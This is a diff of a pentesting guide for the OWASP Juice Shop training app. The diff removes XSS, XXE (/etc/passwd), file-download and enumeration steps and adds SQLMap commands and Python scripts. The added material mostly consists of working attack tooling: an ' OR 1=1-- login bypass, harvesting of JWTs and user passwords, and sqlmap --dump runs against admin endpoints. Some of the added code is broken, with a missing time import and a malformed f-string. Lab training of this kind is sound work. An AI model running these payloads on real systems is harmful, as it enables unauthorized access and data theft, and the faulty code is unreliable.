@@ -413,350 +413,340 @@ if __name__ == "__main__":
     tester.generate_report(results)
 ```
 
----
+### SQLMap with Authentication Tokens
 
-## 2. Cross-Site Scripting (XSS)
+**Objective:** Use SQLMap with JWT tokens for authenticated testing
 
-### Reflected XSS
-
-1. Go to the search bar.
-2. Enter: `<script>alert(1)</script>`
-3. Observe alert popup.
-
-### Stored XSS
-
-1. Register a new user.
-2. Post a product review with: `<img src=x onerror=alert(1)>`
-3. View the review to trigger the alert.
-
----
-
-## 3. Broken Authentication
-
-### Password Reset Poisoning
-
-1. Register a user with your email.
-2. Request password reset.
-3. Intercept the reset link (Burp Suite) and modify the host header to a server you control.
-4. Capture the reset token.
-
----
-
-## 4. Sensitive Data Exposure
-
-### Directory and File Discovery with Gobuster
-
-**Objective:** Discover hidden files, directories, and sensitive endpoints
-
-**Prerequisites:**
+#### 1. Using Cookies/Session Tokens
 
 ```zsh
-# Install gobuster (if not already installed)
-brew install gobuster
-
-# Download common wordlists
-git clone https://github.com/danielmiessler/SecLists.git ~/SecLists
+# Using session cookies
+sqlmap -u "http://10.30.0.237:3000/rest/user/login" \
+  --cookie="token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." \
+  --data='{"email":"test@test.com","password":"test123"}' \
+  --headers="Content-Type: application/json" \
+  --dbms=sqlite --batch
 ```
 
-**Steps:**
-
-#### 1. Basic Directory Enumeration
+#### 2. Using Authorization Headers
 
 ```zsh
-# Basic directory discovery
-gobuster dir -u http://10.30.0.237:3000 \
-  -w ~/SecLists/Discovery/Web-Content/common.txt \
-  -t 50 -x txt,php,html,js,json,xml
+# Using Bearer token in Authorization header
+sqlmap -u "http://10.30.0.237:3000/rest/products/search?q=test" \
+  --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." \
+  --dbms=sqlite --batch
 
-# Extended directory discovery
-gobuster dir -u http://10.30.0.237:3000 \
-  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-  -t 100 -x txt,php,html,js,json,xml,bak,old \
-  --timeout 10s
+# Using custom headers for admin endpoints
+sqlmap -u "http://10.30.0.237:3000/rest/admin/application-configuration" \
+  --headers="Authorization: Bearer YOUR_JWT_TOKEN_HERE" \
+  --headers="Content-Type: application/json" \
+  --dbms=sqlite --batch
 ```
 
-#### 2. API Endpoint Discovery
-
-```zsh
-# Discover API endpoints
-gobuster dir -u http://10.30.0.237:3000/api \
-  -w ~/SecLists/Discovery/Web-Content/api/objects.txt \
-  -t 50
-
-# REST API enumeration
-gobuster dir -u http://10.30.0.237:3000/rest \
-  -w ~/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
-  -t 50
-```
-
-#### 3. File Extension Fuzzing
-
-```zsh
-# Look for backup files and configs
-gobuster dir -u http://10.30.0.237:3000 \
-  -w ~/SecLists/Discovery/Web-Content/raft-small-files.txt \
-  -t 50 -x bak,backup,old,orig,save,conf,config,ini
-
-# Search for common sensitive files
-gobuster dir -u http://10.30.0.237:3000 \
-  -w ~/SecLists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt \
-  -t 50 -x php,txt,log
-```
-
-#### 4. Admin Panel Discovery
-
-```zsh
-# Find admin panels and management interfaces
-gobuster dir -u http://10.30.0.237:3000 \
-  -w ~/SecLists/Discovery/Web-Content/CMS/wp-admin.txt \
-  -t 50
-
-# Custom admin wordlist for Juice Shop
-echo -e "admin\nadministration\nmanagement\nscore-board\naccounting\nmetrics\nmonitoring" > juice_admin.txt
-gobuster dir -u http://10.30.0.237:3000 \
-  -w juice_admin.txt \
-  -t 20
-```
-
-#### 5. Comprehensive Automation Script
+#### 3. Automated Token Extraction and Usage
 
 ```python
 #!/usr/bin/env python3
 """
-Gobuster Automation for OWASP Juice Shop
+SQLMap with JWT Token Authentication for Juice Shop
 """
+import requests
 import subprocess
 import json
-import time
-from concurrent.futures import ThreadPoolExecutor
+import re
 
-class JuiceShopGobuster:
-    def __init__(self, target_url="http://10.30.0.237:3000"):
-        self.target_url = target_url
-        self.wordlists = {
-            "common": "~/SecLists/Discovery/Web-Content/common.txt",
-            "medium": "~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt",
-            "big": "~/SecLists/Discovery/Web-Content/big.txt",
-            "files": "~/SecLists/Discovery/Web-Content/raft-small-files.txt",
-            "api": "~/SecLists/Discovery/Web-Content/api/objects.txt"
+class JuiceShopAuthenticatedSQLi:
+    def __init__(self, base_url="http://10.30.0.237:3000"):
+        self.base_url = base_url
+        self.token = None
+        self.session = requests.Session()
+
+    def authenticate(self, email="admin@juice-sh.op' OR 1=1--", password="password"):
+        """Get JWT token through login"""
+        login_data = {
+            "email": email,
+            "password": password
         }
-        self.results = []
 
-    def run_gobuster(self, path="", wordlist="common", extensions="txt,php,html,js,json"):
-        """Run gobuster with specified parameters"""
-        full_url = f"{self.target_url}{path}"
-        wordlist_path = self.wordlists.get(wordlist, wordlist)
+        response = self.session.post(
+            f"{self.base_url}/rest/user/login",
+            json=login_data,
+            headers={"Content-Type": "application/json"}
+        )
+
+        if response.status_code == 200:
+            data = response.json()
+            self.token = data.get("authentication", {}).get("token")
+            if self.token:
+                print(f"[+] Successfully obtained JWT token: {self.token[:50]}...")
+                return True
+
+        print("[-] Failed to obtain token")
+        return False
+
+    def run_authenticated_sqlmap(self, target_url, additional_args=""):
+        """Run SQLMap with authentication token"""
+        if not self.token:
+            print("[-] No token available. Authenticate first.")
+            return False
 
         cmd = [
-            "gobuster", "dir",
-            "-u", full_url,
-            "-w", wordlist_path,
-            "-t", "50",
-            "-x", extensions,
-            "--timeout", "10s",
-            "-q"  # Quiet mode for cleaner output
+            "sqlmap", "-u", target_url,
+            "--headers", f"Authorization: Bearer {self.token}",
+            "--headers", "Content-Type: application/json",
+            "--dbms=sqlite", "--batch"
         ]
 
-        print(f"[+] Running: {' '.join(cmd)}")
+        if additional_args:
+            cmd.extend(additional_args.split())
+
+        print(f"[+] Running authenticated SQLMap: {' '.join(cmd)}")
 
         try:
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-            findings = []
-
-            for line in result.stdout.split('\n'):
-                if line.strip() and not line.startswith('='):
-                    findings.append(line.strip())
-
             return {
-                "path": path,
-                "wordlist": wordlist,
-                "findings": findings,
-                "success": True
+                "success": result.returncode == 0,
+                "output": result.stdout,
+                "errors": result.stderr
             }
         except subprocess.TimeoutExpired:
-            return {
-                "path": path,
-                "wordlist": wordlist,
-                "findings": [],
-                "success": False,
-                "error": "Timeout"
-            }
-        except Exception as e:
-            return {
-                "path": path,
-                "wordlist": wordlist,
-                "findings": [],
-                "success": False,
-                "error": str(e)
-            }
+            return {"success": False, "errors": "Timeout expired"}
 
-    def comprehensive_scan(self):
-        """Run comprehensive gobuster scans"""
-        scan_targets = [
-            {"path": "", "wordlist": "common", "extensions": "txt,html,js,json,xml"},
-            {"path": "/api", "wordlist": "api", "extensions": ""},
-            {"path": "/rest", "wordlist": "common", "extensions": ""},
-            {"path": "", "wordlist": "files", "extensions": "bak,backup,old,conf,log"},
-            {"path": "/ftp", "wordlist": "common", "extensions": "txt,pdf,zip,tar.gz"},
+    def test_authenticated_endpoints(self):
+        """Test endpoints that require authentication"""
+        authenticated_targets = [
+            {
+                "name": "User Profile",
+                "url": f"{self.base_url}/rest/user/whoami",
+                "args": ""
+            },
+            {
+                "name": "Admin Configuration",
+                "url": f"{self.base_url}/rest/admin/application-configuration",
+                "args": "--technique=B"
+            },
+            {
+                "name": "User Authentication Details",
+                "url": f"{self.base_url}/rest/user/authentication-details",
+                "args": "--dump"
+            },
+            {
+                "name": "Basket Items",
+                "url": f"{self.base_url}/rest/basket/1",
+                "args": "--technique=BEU"
+            }
         ]
 
-        with ThreadPoolExecutor(max_workers=3) as executor:
-            futures = []
-            for target in scan_targets:
-                future = executor.submit(
-                    self.run_gobuster,
-                    target["path"],
-                    target["wordlist"],
-                    target["extensions"]
-                )
-                futures.append(future)
+        results = []
+        for target in authenticated_targets:
+            print(f"\n[+] Testing authenticated endpoint: {target['name']}")
+            result = self.run_authenticated_sqlmap(target["url"], target["args"])
+            results.append({
+                "endpoint": target["name"],
+                "url": target["url"],
+                "result": result
+            })
 
-            for future in futures:
-                result = future.result()
-                self.results.append(result)
-                if result["success"] and result["findings"]:
-                    print(f"\n[!] Found paths for {result['path']}:")
-                    for finding in result["findings"]:
-                        print(f"    {finding}")
+        return results
 
-    def generate_report(self):
-        """Generate findings report"""
-        all_findings = []
-        for result in self.results:
-            if result["success"]:
-                all_findings.extend(result["findings"])
-
+    def generate_authenticated_report(self, results):
+        """Generate report for authenticated testing"""
         report = {
             "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
-            "target": self.target_url,
-            "total_findings": len(all_findings),
-            "results": self.results,
-            "unique_findings": list(set(all_findings))
+            "token_used": self.token[:50] + "..." if self.token else "None",
+            "total_endpoints": len(results),
+            "successful_tests": len([r for r in results if r["result"]["success"]]),
+            "results": results
         }
 
-        with open("juice_shop_gobuster_report.json", "w") as f:
+        with open("juice_shop_authenticated_sqli_report.json", "w") as f:
             json.dump(report, f, indent=2)
 
         print(f"\n{'='*50}")
-        print("GOBUSTER SCAN REPORT")
+        print("AUTHENTICATED SQL INJECTION REPORT")
         print(f"{'='*50}")
-        print(f"Total findings: {report['total_findings']}")
-        print("Report saved to: juice_shop_gobuster_report.json")
+        print(f"Total endpoints tested: {report['total_endpoints']}")
+        print(f"Successful tests: {report['successful_tests']}")
+        print("Report saved to: juice_shop_authenticated_sqli_report.json")
 
         return report
 
 if __name__ == "__main__":
-    scanner = JuiceShopGobuster()
-    scanner.comprehensive_scan()
-    scanner.generate_report()
+    # Initialize tester
+    auth_tester = JuiceShopAuthenticatedSQLi()
+
+    # Authenticate and get token
+    if auth_tester.authenticate():
+        # Test authenticated endpoints
+        results = auth_tester.test_authenticated_endpoints()
+        auth_tester.generate_authenticated_report(results)
+    else:
+        print("Authentication failed. Cannot proceed with authenticated testing.")
 ```
 
-### Accessing Confidential Files
-
-#### Manual Discovery
-
-1. Go to `/ftp` or `/encryptionkeys` endpoints.
-2. Download files directly.
-3. Try common paths:
-   - `/robots.txt`
-   - `/sitemap.xml`
-   - `/security.txt`
-   - `/.well-known/`
-   - `/backup/`
-   - `/config/`
-
-#### Specific Juice Shop Sensitive Endpoints
+#### 4. Session-Based SQLMap Testing
 
 ```zsh
-# Test known sensitive endpoints
-curl -I http://10.30.0.237:3000/ftp
-curl -I http://10.30.0.237:3000/encryptionkeys
-curl -I http://10.30.0.237:3000/robots.txt
-curl -I http://10.30.0.237:3000/security.txt
-curl -I http://10.30.0.237:3000/.well-known/security.txt
+# First, get a session by logging in
+curl -c cookies.txt -X POST "http://10.30.0.237:3000/rest/user/login" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"password"}'
 
-# Download accessible files
-wget http://10.30.0.237:3000/ftp/package.json.bak
-wget http://10.30.0.237:3000/encryptionkeys/premium.key
+# Use the saved cookies with SQLMap
+sqlmap -u "http://10.30.0.237:3000/rest/user/whoami" \
+  --load-cookies=cookies.txt \
+  --dbms=sqlite --batch --technique=B
+
+# Test admin endpoints with session
+sqlmap -u "http://10.30.0.237:3000/rest/admin/application-configuration" \
+  --load-cookies=cookies.txt \
+  --dbms=sqlite --batch --dump
 ```
 
-#### Automated File Discovery
+#### 5. Advanced Token-Based Testing
 
-```zsh
-# Create custom wordlist for Juice Shop
-cat > juice_files.txt << EOF
-package.json.bak
-premium.key
-eastere.gg
-incident-support.kdbx
-coupons_2013.md.bak
-acquisitions.md
-legal.md
-package.json
-bower.json
-Gruntfile.js
-gulpfile.js
-EOF
+```python
+#!/usr/bin/env python3
+"""
+Advanced Token-Based SQLMap Testing for Juice Shop
+"""
+import requests
+import subprocess
+import json
+import time
+import base64
 
-# Run gobuster with custom wordlist
-gobuster dir -u http://10.30.0.237:3000/ftp \
-  -w juice_files.txt \
-  -t 20 --timeout 5s
+class AdvancedJuiceShopSQLi:
+    def __init__(self, base_url="http://10.30.0.237:3000"):
+        self.base_url = base_url
+        self.tokens = {}
+        self.session = requests.Session()
+
+    def decode_jwt(self, token):
+        """Decode JWT token to inspect claims"""
+        try:
+            # JWT has 3 parts separated by dots
+            header, payload, signature = token.split('.')
+
+            # Add padding if needed
+            payload += '=' * (4 - len(payload) % 4)
+
+            # Decode base64
+            decoded = base64.b64decode(payload)
+            return json.loads(decoded)
+        except Exception as e:
+            print(f"Error decoding JWT: {e}")
+            return None
+
+    def get_multiple_tokens(self):
+        """Get tokens for different user roles"""
+        users = [
+            {"email": "admin@juice-sh.op' OR 1=1--", "password": "password", "role": "admin"},
+            {"email": "jim@juice-sh.op", "password": "ncc-1701", "role": "user"},
+            {"email": "bender@juice-sh.op", "password": "OhG0dPlease1nsertLiquor!", "role": "user"}
+        ]
+
+        for user in users:
+            response = self.session.post(
+                f"{self.base_url}/rest/user/login",
+                json={"email": user["email"], "password": user["password"]},
+                headers={"Content-Type": "application/json"}
+            )
+
+            if response.status_code == 200:
+                data = response.json()
+                token = data.get("authentication", {}).get("token")
+                if token:
+                    self.tokens[user["role"]] = token
+                    decoded = self.decode_jwt(token)
+                    print(f"[+] Got {user['role']} token: {token[:30]}...")
+                    if decoded:
+                        print(f"    User ID: {decoded.get('data', {}).get('id')}")
+                        print(f"    Email: {decoded.get('data', {}).get('email')}")
+
+    def test_role_based_sqli(self):
+        """Test SQL injection with different user roles"""
+        endpoints = [
+            {"url": f"{self.base_url}/rest/user/whoami", "roles": ["admin", "user"]},
+            {"url": f"{self.base_url}/rest/admin/application-configuration", "roles": ["admin"]},
+            {"url": f"{self.base_url}/rest/basket/1", "roles": ["admin", "user"]},
+            {"url": f"{self.base_url}/rest/user/authentication-details", "roles": ["admin"]},
+        ]
+
+        results = []
+        for endpoint in endpoints:
+            for role in endpoint["roles"]:
+                if role in self.tokens:
+                    print(f"\n[+] Testing {endpoint['url']} with {role} token")
+
+                    cmd = [
+                        "sqlmap", "-u", endpoint["url"],
+                        "--headers", f"Authorization: Bearer {self.tokens[role]}",
+                        "--headers", "Content-Type: application/json",
+                        "--dbms=sqlite", "--batch", "--technique=B"
+                    ]
+
+                    try:
+                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+                        results.append({
+                            "endpoint": endpoint["url"],
+                            "role": role,
+                            "success": result.returncode == 0,
+                            "output": result.stdout,
+                            "vulnerable": "injectable" in result.stdout.lower()
+                        })
+                    except subprocess.TimeoutExpired:
+                        results.append({
+                            "endpoint": endpoint["url"],
+                            "role": role,
+                            "success": False,
+                            "error": "Timeout"
+                        })
+
+        return results
+
+    def parameter_injection_test(self):
+        """Test parameter-based injection with tokens"""
+        injection_points = [
+            {
+                "url": f"{self.base_url}/rest/products/search",
+                "param": "q",
+                "value": "test"
+            },
+            {
+                "url": f"{self.base_url}/rest/track-order/1",
+                "param": "id",
+                "value": "1"
+            },
+            {
+                "url": f"{self.base_url}/rest/user/change-password",
+                "param": "current",
+                "value": "test",
+                "method": "POST"
+            }
+        ]
+
+        for point in injection_points:
+            if "admin" in self.tokens:
+                print(f"\n[+] Testing parameter injection at {point['url']}")
+
+                if point.get("method") == "POST":
+                    cmd = [
+                        "sqlmap", "-u", point["url"],
+                        "--data", f'{{{"\"{point[\"param\"]}\"":"\"{point[\"value\"]}\""}}}',
+                        "--headers", f"Authorization: Bearer {self.tokens['admin']}",
+                        "--headers", "Content-Type: application/json",
+                        "--dbms=sqlite", "--batch", "--level=3"
+                    ]
+                else:
+                    cmd = [
+                        "sqlmap", "-u", f"{point['url']}?{point['param']}={point['value']}",
+                        "--headers", f"Authorization: Bearer {self.tokens['admin']}",
+                        "--dbms=sqlite", "--batch", "--level=3"
+                    ]
+
+                try:
+                    subprocess.run(cmd, timeout=180)
+                except subprocess.TimeoutExpired:
+                    print(f"[-] Timeout testing {point['url']}")
 ```
-
----
-
-## 5. Broken Access Control
-
-### Access Admin Panel
-
-1. Try `/administration` or `/score-board` directly in the URL bar.
-2. Use an admin JWT if needed (see SQLi or XSS to steal tokens).
-
----
-
-## 6. Security Misconfiguration
-
-### Exposed Debug Endpoints
-
-1. Visit `/rest/admin/application-configuration` or `/rest/user/authentication-details`.
-2. Sensitive info may be exposed.
-
----
-
-## 7. XXE (XML External Entities)
-
-1. Find a file upload or XML endpoint.
-2. Upload XML with external entity:
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<request><data>&xxe;</data></request>
-```
-
----
-
-## 8. Unvalidated Redirects
-
-1. Find a redirect endpoint (e.g., after login or logout).
-2. Manipulate the `to` parameter to redirect to an external site.
-
----
-
-## 9. Miscellaneous
-
-- Try default credentials: `admin@juice-sh.op` / `admin123`
-- Use Burp Suite for fuzzing and intercepting requests
-- Check `/robots.txt` and `/security.txt` for hints
-
----
-
-## References
-
-- [Official Solutions](https://help.owasp-juice.shop/appendix/solutions.html)
-- [Pwning OWASP Juice Shop Book](https://pwning.owasp-juice.shop/)
-
----
-
-**Disclaimer:** For educational use only. Only test on systems you own or have permission to test.
